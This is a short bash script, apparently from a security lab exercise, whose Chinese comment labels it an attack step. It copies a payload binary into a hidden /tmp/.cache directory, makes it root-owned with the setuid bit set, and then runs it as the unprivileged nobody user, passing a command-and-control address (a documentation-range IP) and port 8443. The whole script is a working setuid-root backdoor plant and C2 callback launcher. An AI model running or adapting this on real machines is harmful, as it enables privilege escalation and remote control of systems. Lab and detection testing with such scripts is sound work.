#!/usr/bin/env bash
# attack（窗口内）：root 属主 setuid 载荷由非特权用户执行。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cp suid.elf /tmp/.cache/suid/suid.elf
chown root:root /tmp/.cache/suid/suid.elf
chmod 4755 /tmp/.cache/suid/suid.elf
if command -v setpriv >/dev/null 2>&1; then
  AS=(setpriv --reuid=65534 --regid=65534 --clear-groups)
else
  AS=(runuser -u nobody --)
fi
"${AS[@]}" /tmp/.cache/suid/suid.elf "$C2_IP" 8443 2> /dev/null || true
